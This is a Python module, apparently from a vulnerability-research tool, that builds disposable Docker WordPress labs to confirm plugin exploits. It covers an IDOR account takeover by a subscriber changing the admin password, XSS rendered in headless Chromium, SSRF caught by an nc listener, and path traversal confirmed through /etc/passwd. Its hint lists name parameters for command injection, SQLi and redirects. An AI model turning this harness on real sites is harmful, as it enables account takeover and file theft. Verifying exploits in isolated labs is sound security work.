"""Dynamic verifier: spins up a REAL, throwaway WordPress + MySQL in Docker, installs the fetched
plugin, and attempts the account-takeover an "missing-authorization"/"idor" hypothesis describes —
log in as the low-privilege user, send the crafted request against an admin account, and confirm by
actually logging in again with the new password. This is the live counterpart to the static PoC
webexploit.py builds and the source grounding websource.py does: everything up to here (classify,
fetch, grep, build PoC) is static; this module is the one piece that RUNS something, so it is kept
separate, Docker-gated, and torn down unconditionally.

Scope (deliberately narrow, matching binoracle's "no false positives" rule — broaden per-class over
time rather than claim more than this can prove): this verifies ONE concrete shape — a WordPress
plugin where an authenticated low-privilege user can change ANOTHER user's email/password because
the handler trusts a user-id parameter from the request instead of checking it against the session.
That is exactly the CVE-2026-5523 shape this was built against. It does not attempt SQLi/XSS/RCE/...
dynamically; those need different confirmation harnesses (see the module docstring's TODO list) and
are future work, not simulated here.

Honesty: `verified` is set to True ONLY when a SECOND, independent login — as the admin account,
with the password THIS run's crafted request set — succeeds against the live WordPress instance.
That is unambiguous proof of account takeover, not a 200 status code or a guess. Everything else
(fetch, plugin install, first login, the crafted request itself) is logged as evidence either way.

Requires a reachable Docker DAEMON (not just the `docker` CLI) — checked explicitly, since the CLI
can be installed with no daemon running (degrades honestly, NOT_APPLICABLE, same pattern as
autosrop_aarch64.py for a missing cross toolchain). Pulls wordpress/mysql/alpine images on first use
(internet needed for that one-time cost, same as `make pwn-image`); the WordPress instance runs on
an isolated per-run Docker network/volume and is always torn down. Its HTTP port is published on a
random high port on all interfaces (see start_wordpress()/_lab_host(): binoracle normally drives
the HOST's daemon through a mounted socket, so a 127.0.0.1-only bind would be unreachable from
binoracle's own container), scoped down by being ephemeral, randomly-ported, and torn down on every
exit — not by network isolation, so only run this against trusted hosts/networks.
"""
from __future__ import annotations

import io
import json
import os
import re
import secrets
import shutil
import socket
import subprocess
import tarfile
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Callable, List, Optional

_MYSQL_IMAGE = "mysql:5.7"
_WP_IMAGE = "wordpress:php8.2-apache"
_WPCLI_IMAGE = "wordpress:cli"
_ALPINE_IMAGE = "alpine:3.20"

_ID_HINTS = ("user_id", "uid", "id", "target", "target_id", "user")
_EMAIL_HINTS = ("email", "mail", "user_email")
_PASS_HINTS = ("pass", "password", "pwd", "user_pass")
_PATH_HINTS = ("file", "path", "page", "template", "include", "doc", "filename", "tpl", "view")
# firma inequivoca de la primera linea de /etc/passwd en cualquier Linux (root, uid/gid 0) --
# usada como fallback de path-traversal cuando el canario propio no se confirma (ver
# verify_wordpress_path_traversal): a diferencia del canario (en /tmp, plantado por nosotros),
# /etc/passwd ya existe siempre, con 0644 legible por cualquier usuario, y es el objetivo EXACTO
# que demuestra el PoC publico ya divulgado de CVE-2024-50508 y de la mayoria de CVEs de este
# tipo -- si esto se confirma y el canario no, aisla el problema a algo especifico del canario.
_PASSWD_SIGNATURE_RE = re.compile(r"root:[^:\n]*:0:0:")
_CMD_HINTS = ("cmd", "command", "exec", "host", "ip", "ping", "target", "query", "addr",
             "domain", "shell")
_SQLI_HINTS = ("id", "search", "q", "query", "name", "term", "filter", "sort", "order")
_URL_HINTS = ("url", "uri", "src", "source", "link", "feed", "webhook", "callback",
             "image", "avatar", "file_url", "endpoint")
_XSS_HINTS = ("comment", "content", "message", "title", "name", "bio", "description", "text",
             "value", "q", "search", "body")
_XML_HINTS = ("xml", "feed", "data", "content", "body", "payload", "import")
_REDIRECT_HINTS = ("redirect", "url", "return", "next", "target", "dest", "destination",
                   "continue", "go", "out", "location")
_FILE_UPLOAD_HINTS = ("file", "upload", "avatar", "image", "attachment", "document", "photo")
_SERIAL_HINTS = ("data", "payload", "value", "options", "settings", "meta", "object", "serialized")


@dataclass
class WpVerifyResult:
    ok: bool = False                 # el flujo corrio hasta el final sin errores de infraestructura
    available: bool = True           # False si ni se pudo intentar (sin Docker daemon, etc.)
    verified: bool = False           # SOLO True si el segundo login con la nueva password funciono
    detail: str = ""
    logs: List[str] = field(default_factory=list)
    limitations: List[str] = field(default_factory=list)
    # evidencia REAL y concreta de la ejecucion contra el laboratorio efimero (no plantilla, no
    # placeholders): el payload exacto enviado, el admin_id real del laboratorio, el codigo de
    # respuesta real, y la password/email reales que el ataque fijo y que el segundo login
    # confirmo que funcionaban. Son datos de un WordPress desechable que ya no existe cuando el
    # analista los lee -- no filtran nada de ningun objetivo real, y sirven como prueba dura de que
    # el flujo se ejecuto de verdad, no que se simulo.
    evidence: dict = field(default_factory=dict)


def _run(cmd: List[str], timeout: float = 60.0, input_text: str = None) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, input=input_text)


def _docker_daemon_ok(timeout: float = 8.0) -> bool:
    """A mano de _docker_image_ok en _sandbox.py: el binario `docker` puede existir sin que el
    DAEMON este arriba (exactamente lo que pasa en este propio sandbox de desarrollo), asi que se
    comprueba de verdad con un comando real y acotado, nunca solo shutil.which."""
    if not shutil.which("docker"):
        return False
    try:
        return _run(["docker", "info"], timeout=timeout).returncode == 0
    except subprocess.TimeoutExpired:
        return False
    except Exception:
        return False


def _pick_param(params, hints) -> Optional[str]:
    """Elige el nombre de parametro mas probable para un rol (id/email/password) entre los que
    cito el LLM, por coincidencia de substring contra una lista de pistas ordenada por prioridad."""
    if not params:
        return None
    names = list(params.keys()) if isinstance(params, dict) else list(params)
    low = {n: n.lower() for n in names}
    for h in hints:
        for n, l in low.items():
            if h in l:
                return n
    return None


def _redirect_location_is_external(location: str, evil_host: str) -> bool:
    """Confirma que una cabecera Location real redirige de verdad al host externo -- NUNCA un
    simple `evil_host in location` (substring), que da un falso positivo real y confirmado en
    vivo: un payload como '/https://{evil_host}/pwned' hace que el servidor devuelva ese string
    LITERAL en Location, pero un navegador lo trata como una ruta RELATIVA al mismo origen (el
    '/' inicial lo ancla ahi), nunca como salto a otro dominio -- el texto 'evil_host' aparece en
    la cadena sin que haya ninguna redireccion externa de verdad. En vez de eso, se recompone la
    URL (normalizando backslash a forward slash, como hacen los navegadores) y se mira el HOST
    real tras resolver el truco de userinfo (user:pass@host -- el host real es lo que va DESPUES
    de la ultima '@'), no si el texto aparece en cualquier parte."""
    if not location or not evil_host:
        return False
    normalized = location.replace("\\", "/")
    netloc = urllib.parse.urlsplit(normalized).netloc
    if not netloc:
        return False
    host = netloc.rsplit("@", 1)[-1].split(":")[0]
    return evil_host.lower() in host.lower()


def _token() -> str:
    return secrets.token_hex(4)


def _lab_host() -> str:
    """Host desde el que se le habla al laboratorio por HTTP. Cuando binoracle corre dentro de un
    contenedor y usa el socket del HOST para pilotar Docker (Docker-fuera-de-Docker, el patron que
    docker-compose.yml monta), el puerto que publicamos para WordPress se abre en el 127.0.0.1 del
    HOST, NO en el 127.0.0.1 de nuestro propio contenedor -- son namespaces de red distintos. Sin
    esto, http_ready y las peticiones del ataque nunca llegaban a WordPress aunque Apache arrancara
    bien (confirmado en vivo: los logs mostraban 'resuming normal operations' pero 'WordPress no
    respondio a tiempo' seguia saliendo). host.docker.internal resuelve al HOST de verdad (Docker
    Desktop en Mac/Windows de forma nativa; en Linux via el extra_hosts que docker-compose.yml
    anade). Si binoracle NO corre en un contenedor (p.ej. los tests de este repo en el sandbox de
    desarrollo), 127.0.0.1 ya es correcto y host.docker.internal no existira.

    Con Burp configurado (ver configure_burp_mcp) esto cambia: quien envia la peticion real ya NO
    es este proceso, es la extension de Burp -- que corre NATIVA en la maquina del analista, FUERA
    de cualquier contenedor. 'host.docker.internal' es un alias de DNS que Docker Desktop solo
    resuelve PARA CONTENEDORES, nunca para el sistema operativo anfitrion en si (confirmado en
    vivo: Burp lanzaba java.net.UnknownHostException: host.docker.internal al intentar enviar la
    peticion de login). El puerto de WordPress se publica con '-p 0.0.0.0::80' (ver
    start_wordpress()), asi que SI es alcanzable desde el host real via 127.0.0.1 -- que es lo que
    hay que darle a Burp en vez del alias que solo entienden los contenedores."""
    if _burp_client is not None:
        return "127.0.0.1"
    if os.path.exists("/.dockerenv"):
        try:
            socket.gethostbyname("host.docker.internal")
            return "host.docker.internal"
        except OSError:
            pass
    return "127.0.0.1"


class _Lab:
    """Agrupa los recursos Docker efimeros de una verificacion (red/volumen/contenedores) y
    garantiza su limpieza. Nunca deja nada vivo, tampoco si algo falla a mitad de camino."""

    def __init__(self, tag: str):
        self.tag = tag
        self.net = f"binoracle-wpverify-{tag}"
        self.vol = f"binoracle-wpverify-{tag}-html"
        self.mysql = f"binoracle-wpverify-{tag}-db"
        self.wp = f"binoracle-wpverify-{tag}-wp"
        self._created: List[str] = []
        self._db_env: List[str] = []   # -e flags reusados por wp_cli() (ver nota en wp_cli)

    def sh(self, *args, timeout=60.0, input_text=None):
        return _run(["docker"] + list(args), timeout=timeout, input_text=input_text)

    def setup_network_and_volume(self):
        self.sh("network", "create", self.net, timeout=30)
        self._created.append(("network", self.net))
        self.sh("volume", "create", self.vol, timeout=30)
        self._created.append(("volume", self.vol))

    def start_mysql(self, root_pw: str, db_pw: str):
        self.sh("run", "-d", "--name", self.mysql, "--network", self.net, "--platform", "linux/amd64",
               "-e", f"MYSQL_ROOT_PASSWORD={root_pw}", "-e", "MYSQL_DATABASE=wordpress",
               "-e", "MYSQL_USER=wordpress", f"-e", f"MYSQL_PASSWORD={db_pw}", _MYSQL_IMAGE,
               timeout=90)
        self._created.append(("container", self.mysql))

    def mysql_ready(self, db_pw: str, tries: int = 150, delay: float = 3.0) -> bool:
        # tries*delay ~ 7.5 min por defecto: en Mac Apple Silicon, mysql:5.7 (sin imagen arm64)
        # corre bajo emulacion (Rosetta/QEMU en Docker Desktop) y el arranque de InnoDB en la
        # PRIMERA ejecucion puede tardar varios minutos -- confirmado en vivo: 40 intentos x 2s
        # (80s) no bastaban y 'MySQL no respondio a tiempo' salia con el contenedor aun
        # inicializando, no realmente colgado.
        for _ in range(tries):
            r = self.sh("exec", self.mysql, "mysqladmin", "ping", "-uwordpress",
                       f"-p{db_pw}", "-h", "127.0.0.1", timeout=10)
            if r.returncode == 0:
                return True
            time.sleep(delay)
        return False

    def start_wordpress(self, db_pw: str) -> Optional[str]:
        """Publica el puerto 80 en un puerto ALEATORIO de todas las interfaces del host (0.0.0.0).
        No se puede restringir a 127.0.0.1: cuando binoracle corre en un contenedor (el caso real,
        via Docker-fuera-de-Docker), un bind a 127.0.0.1 solo seria alcanzable desde el PROPIO
        host, nunca desde nuestro contenedor ni desde ningun otro -- ver _lab_host(). El riesgo se
        acota con un puerto aleatorio de corta vida, torn down siempre al final, y siendo esto un
        laboratorio efimero pensado solo para objetivos/engagements autorizados."""
        # Guardadas para reusar en wp_cli(): wp-config.php (de la imagen oficial) lee estas
        # variables en TIEMPO DE EJECUCION via getenv_docker(), no las hornea en el fichero. El
        # contenedor wp-cli es OTRO contenedor (solo comparte el volumen, no el entorno del
        # contenedor de Apache), asi que sin pasarselas tambien a el, getenv_docker() cae a su
        # valor por defecto ('mysql') y wp-cli intenta conectar a un host que no existe.
        self._db_env = ["-e", f"WORDPRESS_DB_HOST={self.mysql}", "-e", "WORDPRESS_DB_NAME=wordpress",
                        "-e", "WORDPRESS_DB_USER=wordpress", "-e", f"WORDPRESS_DB_PASSWORD={db_pw}"]
        self.sh("run", "-d", "--name", self.wp, "--network", self.net, "--platform", "linux/amd64",
               "-v", f"{self.vol}:/var/www/html", *self._db_env,
               "-p", "0.0.0.0::80", _WP_IMAGE, timeout=90)
        self._created.append(("container", self.wp))
        r = self.sh("port", self.wp, "80", timeout=15)
        m = re.search(r":(\d+)\s*$", (r.stdout or "").strip())
        return m.group(1) if m else None

    def http_ready(self, port: str, tries: int = 150, delay: float = 3.0) -> bool:
        # igual que mysql_ready (~7.5 min): confirmado en vivo que 80x3s (4 min) tampoco bastaba
        # en Apple Silicon -- Apache/PHP bajo emulacion amd64 puede tardar varios minutos en
        # responder al primer arranque, igual que le pasaba a MySQL.
        import urllib.request
        url = f"http://{_lab_host()}:{port}/wp-login.php"
        for _ in range(tries):
            try:
                with urllib.request.urlopen(url, timeout=5) as r:
                    if r.status < 500:
                        return True
            except Exception:
                pass
            time.sleep(delay)
        return False

    def logs_tail(self, name: str, lines: int = 40) -> str:
        """Ultimas lineas del log de un contenedor, para diagnosticar fallos de arranque sin
        tener que reproducirlos (p.ej. por que Apache/MySQL no respondieron a tiempo)."""
        try:
            r = self.sh("logs", "--tail", str(lines), name, timeout=15)
            return ((r.stdout or "") + (r.stderr or "")).strip()
        except Exception as e:
            return f"(no se pudieron leer logs de {name}: {e})"

    def write_canary(self, path: str, content: str, timeout: float = 15.0) -> bool:
        """Escribe un fichero DENTRO del propio contenedor de Apache (no en el volumen compartido
        /var/www/html -- esto usa `docker exec` directo), en una ruta del sistema de ficheros real
        del contenedor. Sirve como marcador para verificar path-traversal/LFI de verdad: si el
        endpoint vulnerable, al pedir una ruta ajena al directorio web, devuelve este contenido
        exacto, es prueba inequivoca de lectura de fichero real -- no una deduccion por status code."""
        r = self.sh("exec", "-i", self.wp, "sh", "-c", f"cat > {path}",
                    input_text=content, timeout=timeout)
        return r.returncode == 0

    def start_listener(self, timeout: float = 30.0) -> Optional[str]:
        """Levanta un contenedor 'callback' en la MISMA red Docker del laboratorio (no en el
        host, no expuesto a internet) que solo escucha en TCP/8080 y vuelca cualquier conexion
        entrante a un fichero. Sirve para confirmar SSRF: si el endpoint vulnerable hace de
        verdad una peticion saliente hacia aqui (porque el SERVIDOR, no el navegador del
        atacante, sigue una URL que el atacante controla), la conexion queda grabada con el
        token unico que iba en la ruta -- prueba de la peticion saliente real, no una
        suposicion por status code."""
        self.listener = f"binoracle-wpverify-{self.tag}-ssrf"
        r = self.sh("run", "-d", "--name", self.listener, "--network", self.net, _ALPINE_IMAGE,
                   "sh", "-c", "while true; do nc -l -p 8080 >> /var/log/ssrf.log 2>&1; done",
                   timeout=timeout)
        if r.returncode != 0:
            return None
        self._created.append(("container", self.listener))
        return self.listener

    def listener_log(self, timeout: float = 10.0) -> str:
        r = self.sh("exec", self.listener, "cat", "/var/log/ssrf.log", timeout=timeout)
        return (r.stdout or "") if r.returncode == 0 else ""

    def container_ip(self, name: str, timeout: float = 10.0) -> Optional[str]:
        """IP interna REAL (no adivinada) del contenedor en la red del laboratorio -- se usa para
        construir variantes de SSRF que apuntan al mismo listener por IP (decimal/hex/octal) en
        vez de por nombre, que es como de verdad se saltan los filtros que solo bloquean
        'localhost'/nombres de host conocidos pero no revisan la IP numerica."""
        r = self.sh("inspect", "-f",
                   f"{{{{(index .NetworkSettings.Networks \"{self.net}\").IPAddress}}}}",
                   name, timeout=timeout)
        ip = (r.stdout or "").strip()
        return ip or None

    def find_in_webroot(self, token: str, timeout: float = 10.0) -> Optional[str]:
        """Busca, DENTRO del propio contenedor Apache, la ruta REAL de un fichero cuyo nombre
        contenga `token` bajo wp-content/uploads -- usado para file-upload, donde WordPress puede
        renombrar/sanear el nombre subido, asi que la ruta publica no se puede adivinar por
        convencion, hay que preguntarle al propio filesystem. `token` es siempre un token nuestro
        (hex, de _token()), nunca entrada de la hipotesis -- no hay inyeccion de shell posible."""
        r = self.sh("exec", self.wp, "sh", "-c",
                   f"find /var/www/html/wp-content/uploads -iname '*{token}*' -type f "
                   f"2>/dev/null | head -1", timeout=timeout)
        p = (r.stdout or "").strip()
        return p or None

    def wp_cli(self, *args, timeout=120.0) -> subprocess.CompletedProcess:
        return self.sh("run", "--rm", "--network", self.net, "--platform", "linux/amd64",
                       "-v", f"{self.vol}:/var/www/html", *self._db_env, "--user", "33:33",
                       _WPCLI_IMAGE, "wp", "--path=/var/www/html", *args, timeout=timeout)

    def install_plugin(self, host_plugin_dir: str, slug: str, timeout=60.0) -> bool:
        """Copia el plugin (ya descargado a `host_plugin_dir`, que contiene <slug>/...) dentro del
        volumen compartido. NO usa un bind mount de `host_plugin_dir`: ese directorio lo creo YO
        (websource.py), dentro del PROPIO contenedor de binoracle -- con Docker-fuera-de-Docker el
        `docker run` real lo ejecuta el daemon del HOST, que no tiene forma de ver una ruta que solo
        existe en nuestro filesystem (confirmado en vivo: tras arreglar la resolucion de red,
        'no se pudo copiar el plugin al laboratorio' seguia saliendo). En vez de eso, empaqueto el
        plugin en un tar EN MEMORIA (si que puedo leerlo yo, es mi propio disco) y lo paso por
        stdin a un contenedor Alpine efimero que solo necesita el volumen Docker con nombre (ese si
        es un recurso del daemon, visible sea donde sea que corra binoracle)."""
        plugin_path = os.path.join(host_plugin_dir, slug)
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w") as tf:
            tf.add(plugin_path, arcname=slug)
        try:
            r = subprocess.run(
                ["docker", "run", "-i", "--rm", "--platform", "linux/amd64",
                 "-v", f"{self.vol}:/var/www/html", _ALPINE_IMAGE, "sh", "-c",
                 "mkdir -p /var/www/html/wp-content/plugins && "
                 "tar -xf - -C /var/www/html/wp-content/plugins"],
                input=buf.getvalue(), capture_output=True, timeout=timeout)
        except subprocess.TimeoutExpired:
            return False
        return r.returncode == 0

    def teardown(self):
        for kind, name in reversed(self._created):
            try:
                if kind == "container":
                    self.sh("rm", "-f", name, timeout=30)
                elif kind == "network":
                    self.sh("network", "rm", name, timeout=15)
                elif kind == "volume":
                    self.sh("volume", "rm", "-f", name, timeout=15)
            except Exception:
                pass


def _screenshot_authenticated(base_url: str, session, path: str) -> Optional[str]:
    """Reusa las cookies de una requests.Session YA autenticada (via _wp_login) para abrir esa
    misma sesion en un Chromium headless (Playwright) y capturar una foto REAL de la pagina --
    evidencia visual, no solo un codigo HTTP. Mismo patron de degradacion honesta que
    dynamic.browser_observe(): si Playwright no esta instalado o el navegador no arranca, devuelve
    None sin romper la verificacion (la evidencia textual ya probada sigue siendo valida sin
    captura). Devuelve la imagen como PNG codificado en base64, o None."""
    try:
        from playwright.sync_api import sync_playwright
    except Exception:
        return None
    import base64
    import tempfile
    from urllib.parse import urlsplit
    host = urlsplit(base_url).hostname or "127.0.0.1"
    cookies = [{"name": c.name, "value": c.value, "domain": host, "path": "/"} for c in session.cookies]
    fd, out_path = tempfile.mkstemp(suffix=".png")
    os.close(fd)
    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(headless=True, args=["--no-sandbox"])
            try:
                ctx = browser.new_context(viewport={"width": 1280, "height": 900})
                ctx.add_cookies(cookies)
                page = ctx.new_page()
                page.goto(base_url + path, wait_until="load", timeout=15000)
                page.screenshot(path=out_path, full_page=True)
            finally:
                browser.close()
        with open(out_path, "rb") as f:
            return base64.b64encode(f.read()).decode("ascii")
    except Exception:
        return None
    finally:
        try:
            os.unlink(out_path)
        except OSError:
            pass


def _screenshot_failed_login(base_url: str, user: str, wrong_password: str) -> Optional[str]:
    """Automatiza el FORMULARIO real de wp-login.php (Playwright, no una peticion POST cruda) con
    una password y captura la pantalla resultante. Se usa DESPUES del ataque, con la password
    ORIGINAL del admin -- si el ataque de verdad la sobreescribio, WordPress debe rechazarla, y
    esta funcion deja la pantalla de error real como prueba (no solo lo deducimos por logica).
    Mismo patron de degradacion honesta que _screenshot_authenticated: sin Playwright, None."""
    try:
        from playwright.sync_api import sync_playwright
    except Exception:
        return None
    import base64
    import tempfile
    fd, out_path = tempfile.mkstemp(suffix=".png")
    os.close(fd)
    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(headless=True, args=["--no-sandbox"])
            try:
                page = browser.new_context(viewport={"width": 1280, "height": 900}).new_page()
                page.goto(base_url + "/wp-login.php", wait_until="load", timeout=15000)
                page.fill("#user_login", user)
                page.fill("#user_pass", wrong_password)
                page.click("#wp-submit")
                page.wait_for_load_state("load", timeout=10000)
                page.screenshot(path=out_path, full_page=True)
            finally:
                browser.close()
        with open(out_path, "rb") as f:
            return base64.b64encode(f.read()).decode("ascii")
    except Exception:
        return None
    finally:
        try:
            os.unlink(out_path)
        except OSError:
            pass


def _xss_render(base_url: str, endpoint: str, method: str, params: dict, cookies: list,
                timeout_ms: int = 15000):
    """Carga la respuesta del endpoint en un Chromium headless REAL (Playwright) -- GET navega
    directamente con los parametros en la query, POST los manda via un formulario auto-enviado
    (pagina data: URL, igual que haria una pagina ajena que la victima visita) -- y devuelve el
    document.title final mas una captura de pantalla. No basta ver el payload reflejado en el
    HTML crudo: solo si el MOTOR JS del navegador lo ejecuto de verdad el title cambia al marcador
    que el payload pide. Devuelve (None, None) si Playwright no esta disponible o algo falla
    (degradacion honesta, igual que _screenshot_authenticated)."""
    try:
        from playwright.sync_api import sync_playwright
    except Exception:
        return None, None
    import base64
    import html as _html
    import tempfile
    from urllib.parse import quote, urlencode
    fd, out_path = tempfile.mkstemp(suffix=".png")
    os.close(fd)
    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(headless=True, args=["--no-sandbox"])
            try:
                ctx = browser.new_context(viewport={"width": 1280, "height": 900})
                if cookies:
                    ctx.add_cookies(cookies)
                page = ctx.new_page()
                if method == "GET":
                    url = base_url + endpoint + ("&" if "?" in endpoint else "?") + urlencode(params)
                    page.goto(url, wait_until="load", timeout=timeout_ms)
                else:
                    inputs = "".join(
                        f'<input type="hidden" name="{_html.escape(str(k))}" '
                        f'value="{_html.escape(str(v))}">' for k, v in params.items())
                    form_html = (f'<html><body><form id="f" method="POST" '
                                f'action="{base_url + endpoint}">{inputs}</form>'
                                f'<script>document.getElementById("f").submit()</script>'
                                f'</body></html>')
                    page.goto("data:text/html," + quote(form_html), timeout=timeout_ms)
                page.wait_for_timeout(800)
                title = page.title()
                page.screenshot(path=out_path, full_page=True)
            finally:
                browser.close()
        with open(out_path, "rb") as f:
            png = base64.b64encode(f.read()).decode("ascii")
        return title, png
    except Exception:
        return None, None
    finally:
        try:
            os.unlink(out_path)
        except OSError:
            pass


class _XssBrowserSession:
    """Reusa UN SOLO Chromium headless (Playwright) a lo largo de muchos intentos, en vez de
    arrancar un proceso de navegador por cada payload -- confirmado en vivo que, con las ~500
    variantes de xss_alert_identifiable.txt (ver payload_kb.py) sumadas a las elegidas a mano, un
    `with sync_playwright() as pw: browser = pw.chromium.launch()` POR INTENTO (el patron
    original de _xss_render) tardaba minutos; el arranque del propio Chromium es el coste real,
    no la navegacion entre paginas. Tambien evita gastar tiempo en page.screenshot() para cada
    intento fallido -- solo se captura cuando `capture=True` (el intento ganador)."""

    def __enter__(self):
        from playwright.sync_api import sync_playwright
        self._pw_cm = sync_playwright()
        self._pw = self._pw_cm.__enter__()
        # el paquete pip de Playwright instalado puede pedir una revision de Chromium distinta
        # de la que este sandbox trae pre-instalada (confirmado en vivo: "chromium_headless_
        # shell-1248" no existe, solo la 1194) -- channel/executablePath explicito al binario
        # 'chromium' completo (no el headless_shell, que es el que falta) evita que Playwright
        # intente descargar nada.
        launch_kwargs = {"headless": True, "args": ["--no-sandbox"]}
        chromium_path = "/opt/pw-browsers/chromium"
        if os.path.exists(chromium_path):
            launch_kwargs["executable_path"] = chromium_path
        self._browser = self._pw.chromium.launch(**launch_kwargs)
        return self

    def __exit__(self, *exc):
        try:
            self._browser.close()
        except Exception:
            pass
        try:
            self._pw_cm.__exit__(*exc)
        except Exception:
            pass
        return False

    def render(self, base_url: str, endpoint: str, method: str, params: dict, cookies: list,
              timeout_ms: int = 15000, capture: bool = False):
        """Misma semantica que _xss_render (navega, devuelve (title, png)) pero sobre el
        navegador YA arrancado -- `png` es None salvo que `capture=True`."""
        import html as _html
        from urllib.parse import quote, urlencode
        try:
            ctx = self._browser.new_context(viewport={"width": 1280, "height": 900})
            try:
                if cookies:
                    ctx.add_cookies(cookies)
                page = ctx.new_page()
                if method == "GET":
                    url = base_url + endpoint + ("&" if "?" in endpoint else "?") + urlencode(params)
                    page.goto(url, wait_until="load", timeout=timeout_ms)
                else:
                    inputs = "".join(
                        f'<input type="hidden" name="{_html.escape(str(k))}" '
                        f'value="{_html.escape(str(v))}">' for k, v in params.items())
                    form_html = (f'<html><body><form id="f" method="POST" '
                                f'action="{base_url + endpoint}">{inputs}</form>'
                                f'<script>document.getElementById("f").submit()</script>'
                                f'</body></html>')
                    page.goto("data:text/html," + quote(form_html), timeout=timeout_ms)
                page.wait_for_timeout(400)
                title = page.title()
                png = None
                if capture:
                    import base64
                    import tempfile
                    fd, out_path = tempfile.mkstemp(suffix=".png")
                    os.close(fd)
                    try:
                        page.screenshot(path=out_path, full_page=True)
                        with open(out_path, "rb") as f:
                            png = base64.b64encode(f.read()).decode("ascii")
                    finally:
                        try:
                            os.unlink(out_path)
                        except OSError:
                            pass
                return title, png
            finally:
                ctx.close()
        except Exception:
            return None, None


# si se configura (ver configure_burp_mcp), TODAS las peticiones de TODOS los verificadores --
# genericos (genericverify.py, que importa esto de aqui en vez de tener su propia copia) y los
# CMS-especificos (via _make_session(), usada por _wp_login/el login de Drupal/Joomla) -- pasan
# por Burp (su extension MCP oficial, ver burpmcp.py) en vez de mandarse directo con `requests`.
# Vive aqui (el modulo "comun" del que ya importan _docker_daemon_ok/_token/etc. el resto de
# verificadores) para que haya un UNICO estado compartido, no una copia por modulo que alguien
# pueda olvidar configurar.
_burp_client = None


def configure_burp_mcp(sse_url: str, timeout: float = 20.0):
    """Conecta al servidor MCP de la extension de Burp (github.com/PortSwigger/mcp-server). Lanza
    BurpMCPError si no puede conectar (p.ej. la extension no esta cargada/activada en Burp) --
    se llama una vez, antes de arrancar las investigaciones (ver cli.py/web.py --burp-mcp-url)."""
    global _burp_client
    from .burpmcp import BurpMCPClient
    if _burp_client is not None:
        _burp_client.close()
    _burp_client = BurpMCPClient(sse_url, timeout=timeout)
    _burp_client.connect()


def _http_request(method: str, url: str, **kwargs):
    if _burp_client is not None:
        from .burpmcp import BurpHttpTransport
        return BurpHttpTransport(_burp_client).request(method, url, **kwargs)
    import requests
    return requests.request(method, url, **kwargs)


def _make_session():
    """Sesion con cookies persistentes entre peticiones -- requests.Session() normal, o (si se
    configuro Burp) BurpSession, que manda cada peticion real a traves de Burp y mantiene las
    mismas cookies que un requests.Session() mantendria, para que el login/flujo de sesion de
    los verificadores CMS-especificos funcione exactamente igual por dentro."""
    if _burp_client is not None:
        from .burpmcp import BurpSession
        return BurpSession(_burp_client)
    import requests
    return requests.Session()


def _wp_login(base_url: str, user: str, password: str, timeout: float = 30.0,
             on_step: Optional[Callable[[str], None]] = None):
    """Login real por cookie de WordPress (wp-login.php). Devuelve una requests.Session (o
    BurpSession, si se configuro Burp) logueada, o None si no hay cookie de sesion (login
    fallido).

    Confirmado en vivo: con los 15s originales, el login fallaba con TimeoutError bajo carga real
    del Mac (varios laboratorios Docker a la vez, o simplemente Apache/PHP bajo emulacion amd64
    yendo lento en ese momento) -- el mismo laboratorio, en otra ejecucion, habia logueado bien.
    Subido con margen generoso por la misma razon que mysql_ready/http_ready ya lo tienen (ver sus
    comentarios): Docker Desktop en Apple Silicon corriendo imagenes amd64 via emulacion puede
    tardar bastante mas de lo que un login normal tardaria en nativo.

    `on_step`, si se da, recibe el motivo CONCRETO del fallo (la excepcion real, o que la
    respuesta no trajo cookie de sesion con su status code) -- confirmado en vivo: antes de
    esto, un fallo de login (de Burp, de red, o de WordPress rechazando las credenciales) SIEMPRE
    se veia igual desde fuera ('no se pudo iniciar sesion'), sin forma de saber CUAL de esas tres
    cosas paso realmente sin instrumentar el codigo a mano cada vez."""
    s = _make_session()
    try:
        r = s.post(f"{base_url}/wp-login.php",
                  data={"log": user, "pwd": password, "wp-submit": "Log In",
                        "redirect_to": f"{base_url}/wp-admin/", "testcookie": "1"},
                  timeout=timeout, allow_redirects=True)
    except Exception as e:
        if on_step:
            on_step(f"_wp_login({user!r}): peticion a wp-login.php fallo: {type(e).__name__}: {e}")
        return None
    logged_in = any(c.name.startswith("wordpress_logged_in_") for c in s.cookies)
    if not logged_in and on_step:
        on_step(f"_wp_login({user!r}): sin cookie de sesion en la respuesta "
               f"(status={getattr(r, 'status_code', '?')}, "
               f"cuerpo[:200]={(getattr(r, 'text', '') or '')[:200]!r})")
    return s if logged_in else None


def _check_prereqs(plugin_source_dir: str, slug: str) -> Optional[WpVerifyResult]:
    """Comprobaciones compartidas por todos los verificadores dinamicos (Docker daemon alcanzable,
    el codigo del plugin tiene la forma esperada). Devuelve un WpVerifyResult YA poblado si algo
    falla (el caller solo tiene que `return`lo), o None si todo esta en orden para seguir."""
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        if not shutil.which("docker"):
            res.detail = "sin cliente docker instalado"
            res.limitations.append("verificacion dinamica NO intentada: el CLI de `docker` no "
                                   "esta instalado en este contenedor (reconstruye la imagen: "
                                   "`docker compose up --build`, ya deberia traerlo)")
        else:
            res.detail = "sin daemon Docker alcanzable"
            res.limitations.append("verificacion dinamica NO intentada: el CLI de docker esta, "
                                   "pero no se alcanza ningun daemon. Si corres binoracle dentro "
                                   "de Docker, monta el socket del host en docker-compose.yml "
                                   "(/var/run/docker.sock:/var/run/docker.sock) y confirma que "
                                   "Docker Desktop/dockerd esta arrancado en tu maquina")
        return res
    if not os.path.isdir(os.path.join(plugin_source_dir, slug)):
        res.detail = f"no se encuentra {slug}/ dentro de {plugin_source_dir}"
        res.limitations.append("el codigo del plugin no tiene la forma esperada (<slug>/...)")
        return res
    return None


@dataclass
class _LabSession:
    """Laboratorio YA levantado hasta el punto comun a TODOS los verificadores dinamicos: WordPress
    instalado, plugin activo, subscriber creado y logueado -- lo unico que cambia entre un
    account-takeover por password y un login-as directo es lo que se hace A PARTIR de aqui."""
    lab: "_Lab"
    base_url: str
    admin_id: str
    admin_user: str
    admin_pass: str
    sub_user: str
    sub_pass: str
    sub_sess: object           # requests.Session, YA autenticada como el subscriber
    admin_sess: object         # requests.Session, autenticada como el admin CON SU PASSWORD ORIGINAL
    shots: list
    capture: Callable


